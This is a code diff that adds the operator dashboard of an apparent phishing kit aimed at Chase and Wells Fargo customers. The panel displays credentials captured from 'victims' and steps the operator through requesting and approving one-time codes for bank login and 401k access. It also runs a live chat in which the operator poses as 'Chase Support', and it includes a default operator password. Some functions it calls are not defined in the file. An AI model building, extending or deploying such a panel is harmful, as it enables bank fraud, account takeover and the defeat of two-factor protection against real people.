@@ -1,0 +1,471 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Dashboard</title>
+    <link rel="icon" type="image/x-icon" href="https://www.chase.com/etc/designs/chase-ux/favicon.ico">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        body {
+            background-color: #1e1e2d;
+            color: #fff;
+            display: flex;
+            height: 100vh;
+            overflow: hidden;
+        }
+        .login-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #151521;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+        .login-box {
+            background: #1e1e2d;
+            padding: 40px;
+            border-radius: 10px;
+            width: 400px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            text-align: center;
+        }
+        .login-box h2 {
+            margin-bottom: 20px;
+            color: #00d2ff;
+        }
+        .login-box input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 20px;
+            border: 1px solid #333;
+            background: #151521;
+            color: #fff;
+            border-radius: 6px;
+        }
+        .login-box button {
+            background-color: #00d2ff;
+            color: #000;
+            padding: 14px;
+            width: 100%;
+            border: none;
+            border-radius: 6px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        .login-box button:hover {
+            background-color: #00b8e6;
+        }
+        
+        .dashboard {
+            display: none;
+            flex: 1;
+            padding: 30px;
+            flex-direction: column;
+        }
+        .header {
+            margin-bottom: 30px;
+            border-bottom: 1px solid #333;
+            padding-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .header h1 {
+            color: #00d2ff;
+        }
+        .btn-clear {
+            background-color: #ff4d4d;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        .panels {
+            display: flex;
+            gap: 30px;
+            flex: 1;
+            overflow: hidden;
+        }
+        .panel {
+            background: #2a2a3f;
+            border-radius: 10px;
+            padding: 20px;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+        }
+        .panel h2 {
+            margin-bottom: 15px;
+            color: #a0a0b8;
+            font-size: 18px;
+            border-bottom: 1px solid #3a3a52;
+            padding-bottom: 10px;
+        }
+        .log-area {
+            flex: 1;
+            overflow-y: auto;
+            background: #151521;
+            padding: 15px;
+            border-radius: 6px;
+            margin-bottom: 15px;
+        }
+        .log-area p {
+            margin-bottom: 10px;
+            padding-bottom: 10px;
+            border-bottom: 1px dashed #333;
+        }
+        .log-area strong {
+            color: #00d2ff;
+        }
+        
+        .chat-message {
+            margin-bottom: 15px;
+            padding: 10px 15px;
+            border-radius: 8px;
+            width: fit-content;
+            max-width: 80%;
+        }
+        .chat-message.user {
+            background: #3a3a52;
+            align-self: flex-start;
+        }
+        .chat-message.admin {
+            background: #004a99;
+            align-self: flex-end;
+            margin-left: auto;
+        }
+        
+        .chat-input-area {
+            display: flex;
+            gap: 10px;
+        }
+        .chat-input-area input {
+            flex: 1;
+            padding: 12px;
+            background: #151521;
+            border: 1px solid #3a3a52;
+            color: white;
+            border-radius: 6px;
+        }
+        .chat-input-area button {
+            background-color: #00d2ff;
+            color: #000;
+            padding: 0 20px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        
+        /* Responsive Styles */
+        @media (max-width: 768px) {
+            .panels {
+                flex-direction: column;
+                overflow-y: auto;
+            }
+            .panel {
+                min-height: 400px;
+                flex: none;
+            }
+            .dashboard {
+                padding: 15px;
+                overflow-y: auto;
+            }
+            .login-box {
+                width: 90%;
+                padding: 20px;
+            }
+        }
+    </style>
+    
+
+</head>
+<body>
+
+    <!-- Login Overlay -->
+    <div class="login-overlay" id="loginOverlay">
+        <div class="login-box">
+            <h2>System Admin Access</h2>
+            <p style="margin-bottom:20px;color:#a0a0b8;">Authenticate to view victim activities.</p>
+            <input type="text" id="loginUsername" placeholder="Username" value="kyung-zi" onkeypress="handleEnter(event)">
+            <input type="password" id="loginPassword" placeholder="Password" value="mysonmeanstheworldtome$" onkeypress="handleEnter(event)">
+            <button onclick="checkLogin()">Login</button>
+        </div>
+    </div>
+
+    <!-- Main Dashboard -->
+    <div class="dashboard" id="dashboard">
+        <div class="header">
+            <h1><span style="color:#fff;">Admin</span> Dashboard</h1>
+            <button class="btn-clear" onclick="clearData()">Clear All Data</button>
+        </div>
+        
+        <div class="panels">
+            <!-- Credentials Panel -->
+            <div class="panel">
+                <h2>Captured Credentials & Activity</h2>
+                <div class="log-area" id="credentialsLog">
+                    <p style="color:#666;">Waiting for victim to submit forms...</p>
+                </div>
+            </div>
+            
+            <!-- OTP Generator Panel -->
+            <div class="panel" style="flex:0.5;">
+                <h2>OTP Generator</h2>
+                <div style="background:#151521; padding:15px; border-radius:6px; text-align:center;">
+                    <p style="color:#a0a0b8; margin-bottom:15px;">Generate a code to send via live chat.</p>
+                    <button onclick="generateOtp()" style="background:#5cb85c; color:white; padding:10px 15px; border:none; border-radius:4px; font-weight:bold; cursor:pointer; width:100%;">Generate Code</button>
+                    <div id="generatedOtpDisplay" style="margin-top:20px; font-size:28px; color:#00d2ff; font-weight:bold; letter-spacing:4px;">------</div>
+                </div>
+            </div>
+            
+            <!-- Live Chat Panel -->
+            <div class="panel">
+                <h2>Live Chat (Chase Support)</h2>
+                <div class="log-area" id="chatLog" style="display:flex;flex-direction:column;">
+                    <p style="color:#666;">Chat history will appear here.</p>
+                </div>
+                <div class="chat-input-area">
+                    <input type="text" id="adminChatInput" placeholder="Reply to victim as Chase Support...">
+                    <button onclick="sendAdminMessage()">Send</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const SUPABASE_URL = 'https://ursrbmvgrpjhuogfimal.supabase.co';
+        const SUPABASE_KEY = 'sb_publishable_tPbGnhGMinGYFI5tc4KbvA_7Gu2Ketw';
+
+        async function setSync(key, value) {
+            try {
+                const res = await fetch(SUPABASE_URL + '/rest/v1/otp_state', {
+                    method: 'POST',
+                    headers: {
+                        'apikey': SUPABASE_KEY,
+                        'Authorization': 'Bearer ' + SUPABASE_KEY,
+                        'Content-Type': 'application/json',
+                        'Prefer': 'resolution=merge-duplicates'
+                    },
+                    body: JSON.stringify({ id: 1, expectedOtp: value })
+                });
+                if (!res.ok) {
+                    const err = await res.text();
+                    console.error('setSync error:', res.status, err);
+                } else {
+                    console.log('setSync OK: expectedOtp =', value);
+                }
+            } catch (e) {
+                console.error('setSync fetch error:', e);
+            }
+        }
+
+        async function getSync(key) {
+            try {
+                const res = await fetch(SUPABASE_URL + '/rest/v1/otp_state?select=expectedOtp&id=eq.1', {
+                    headers: {
+                        'apikey': SUPABASE_KEY,
+                        'Authorization': 'Bearer ' + SUPABASE_KEY
+                    }
+                });
+                if (!res.ok) {
+                    const err = await res.text();
+                    console.error('getSync error:', res.status, err);
+                    return null;
+                }
+                const rows = await res.json();
+                const val = (rows && rows.length > 0) ? rows[0].expectedOtp : null;
+                console.log('getSync OK: expectedOtp =', val);
+                return val || null;
+            } catch (e) {
+                console.error('getSync fetch error:', e);
+                return null;
+            }
+        }
+
+        function handleEnter(e) {
+            if (e.key === 'Enter') {
+                checkLogin();
+            }
+        }
+
+        function checkLogin() {
+            let u = document.getElementById('loginUsername').value;
+            let p = document.getElementById('loginPassword').value;
+            if (u && p) {
+                document.getElementById('loginOverlay').style.display = 'none';
+                document.getElementById('dashboard').style.display = 'flex';
+                startPolling();
+            } else {
+                alert('Please enter both username and password.');
+            }
+        }
+
+        function startPolling() {
+            setInterval(async () => {
+            globalState = await getFullState();
+                // Poll Credentials
+                let logs = getSyncItem('adminLogs');
+                if (logs) {
+                    document.getElementById('credentialsLog').innerHTML = logs;
+                }
+                
+                // Poll Chat History
+                let chats = getSyncItem('chatHistory');
+                if (chats) {
+                    document.getElementById('chatLog').innerHTML = chats;
+                    // Auto scroll to bottom (simple version)
+                    let chatArea = document.getElementById('chatLog');
+                    chatArea.scrollTop = chatArea.scrollHeight;
+                }
+                
+                // Add action buttons if they don't exist in the log area (client side only)
+                injectAdminActions();
+            }, 1000);
+        }
+        
+        function injectAdminActions() {
+            let logArea = document.getElementById('credentialsLog');
+            
+            // 401k Actions
+            let s401k = getSyncItem('401kStatus');
+            if (s401k === 'submitted' && !document.getElementById('btnReqOtp401k')) {
+                logArea.innerHTML += `<div id="action401k_1" style="margin-top:10px; padding:10px; background:#3a3a52; border-radius:6px;">
+                    <strong style="color:orange;">Action Required (401k):</strong><br>
+                    <button id="btnReqOtp401k" onclick="requestOtp('401kStatus')" style="margin-top:5px; padding:5px 10px; background:#d9534f; color:white; border:none; border-radius:4px; cursor:pointer;">Request OTP</button>
+                </div>`;
+            } else if (s401k === 'otp_submitted' && !document.getElementById('btnApprove401k')) {
+                let oldAction = document.getElementById('action401k_1');
+                if(oldAction) oldAction.style.display = 'none';
+                
+                logArea.innerHTML += `<div id="action401k_2" style="margin-top:10px; padding:10px; background:#3a3a52; border-radius:6px;">
+                    <strong style="color:orange;">Action Required (401k):</strong><br>
+                    <button id="btnApprove401k" onclick="approveStep('401kStatus')" style="margin-top:5px; padding:5px 10px; background:#5cb85c; color:white; border:none; border-radius:4px; cursor:pointer;">Approve Process</button>
+                </div>`;
+            }
+            
+            // Wells Fargo Actions
+            let swf = getSyncItem('wfStatus');
+            if (swf === 'submitted' && !document.getElementById('btnReqOtpWf')) {
+                logArea.innerHTML += `<div id="actionWf_1" style="margin-top:10px; padding:10px; background:#3a3a52; border-radius:6px;">
+                    <strong style="color:orange;">Action Required (Wells Fargo):</strong><br>
+                    <button id="btnReqOtpWf" onclick="requestOtp('wfStatus')" style="margin-top:5px; padding:5px 10px; background:#d9534f; color:white; border:none; border-radius:4px; cursor:pointer;">Request OTP</button>
+                </div>`;
+            } else if (swf === 'otp_submitted' && !document.getElementById('btnApproveWf')) {
+                let oldAction = document.getElementById('actionWf_1');
+                if(oldAction) oldAction.style.display = 'none';
+                
+                logArea.innerHTML += `<div id="actionWf_2" style="margin-top:10px; padding:10px; background:#3a3a52; border-radius:6px;">
+                    <strong style="color:orange;">Action Required (Wells Fargo):</strong><br>
+                    <button id="btnApproveWf" onclick="approveStep('wfStatus')" style="margin-top:5px; padding:5px 10px; background:#5cb85c; color:white; border:none; border-radius:4px; cursor:pointer;">Approve Process</button>
+                </div>`;
+            }
+            // Transaction History Actions
+            let stx = getSyncItem('txStatus');
+            if (stx === 'otp_submitted' && !document.getElementById('btnApproveTx')) {
+                logArea.innerHTML += `<div id="actionTx_2" style="margin-top:10px; padding:10px; background:#3a3a52; border-radius:6px;">
+                    <strong style="color:orange;">Action Required (Transaction History):</strong><br>
+                    <button id="btnApproveTx" onclick="approveStep('txStatus')" style="margin-top:5px; padding:5px 10px; background:#5cb85c; color:white; border:none; border-radius:4px; cursor:pointer;">Approve Process</button>
+                </div>`;
+            }
+            
+            // Initial Chase Login Actions
+            let sLog = getSyncItem('loginStatus');
+            if (sLog === 'otp_submitted' && !document.getElementById('btnApproveLogin')) {
+                logArea.innerHTML += `<div id="actionLogin_2" style="margin-top:10px; padding:10px; background:#3a3a52; border-radius:6px;">
+                    <strong style="color:orange;">Action Required (Initial Chase Login):</strong><br>
+                    <button id="btnApproveLogin" onclick="approveStep('loginStatus')" style="margin-top:5px; padding:5px 10px; background:#5cb85c; color:white; border:none; border-radius:4px; cursor:pointer;">Approve Login</button>
+                </div>`;
+            }
+        }
+        
+        async function requestOtp(statusKey) {
+            await setSyncItem(statusKey, 'pending_otp', null);
+            alert('Requested OTP from victim.');
+        }
+        
+        async function approveStep(statusKey) {
+            await setSyncItem(statusKey, 'approved', null);
+            alert('Process approved.');
+            if(statusKey === '401kStatus') {
+                let el = document.getElementById('action401k_2');
+                if(el) el.style.display = 'none';
+            } else if (statusKey === 'wfStatus') {
+                let el = document.getElementById('actionWf_2');
+                if(el) el.style.display = 'none';
+            } else if (statusKey === 'txStatus') {
+                let el = document.getElementById('actionTx_2');
+                if(el) el.style.display = 'none';
+            } else if (statusKey === 'loginStatus') {
+                let el = document.getElementById('actionLogin_2');
+                if(el) el.style.display = 'none';
+            }
+        }
+
+        async function submit401kOtp() {
+            let otp = document.getElementById('401kOtp').value.trim();
+            const expected = await getSyncItem('expectedOtp') || "";
+            if (otp) {
+                let logEntry = `<p><strong>401k OTP Attempt:</strong> ${otp}</p>`;
+                let currentLogs = getSyncItem('adminLogs') || '';
+                await setSyncItem('adminLogs', currentLogs + logEntry, null);
+                console.log('401k OTP entered:', otp, 'expected:', expected);
+                if (otp === expected) {
+                    document.getElementById('status401k').innerHTML = '<span style="color:green;"><i class="fas fa-check-circle"></i> Verification Complete!</span>';
+                    await setSyncItem('401kStatus', 'approved', null);
+                    await setSyncItem('expectedOtp', null);
+                    document.getElementById('otp401kGroup').style.display = 'none';
+                } else {
+                    alert('Invalid OTP code. Please try again.');
+                    document.getElementById('401kOtp').value = '';
+                }
+            } else {
+                alert('Please enter the OTP code.');
+            }
+        }
+
+        async function sendAdminMessage() {
+            let input = document.getElementById('adminChatInput').value;
+            if(input.trim() === "") return;
+            
+            let chatEntry = `<div class="chat-message admin"><strong>Chase Support:</strong> ${input}</div>`;
+            let currentChats = getSyncItem('chatHistory') || '';
+            await setSyncItem('chatHistory', currentChats + chatEntry, null);
+            
+            document.getElementById('adminChatInput').value = "";
+        }
+        
+        async function generateOtp() {
+            let code = Math.floor(100000 + Math.random() * 900000).toString(); // Generate random 6-digit code
+            console.log('Generated OTP:', code);
+            await setSyncItem('expectedOtp', code); // Store in Supabase
+            document.getElementById('generatedOtpDisplay').innerText = code;
+            
+            // Optionally, we could automatically put it in the chat input for convenience:
+            document.getElementById('adminChatInput').value = `Your verification code is: ${code}`;
+        }
+        
+        async function clearData() {
+            if(confirm('Are you sure you want to clear all captured data and chat history?')) {
+                await setFullState({}); globalState = {};
+                document.getElementById('credentialsLog').innerHTML = '<p style="color:#666;">Waiting for victim to submit forms...</p>';
+                document.getElementById('chatLog').innerHTML = '';
+            }
+        }
+    </script>
+</body>
+</html>
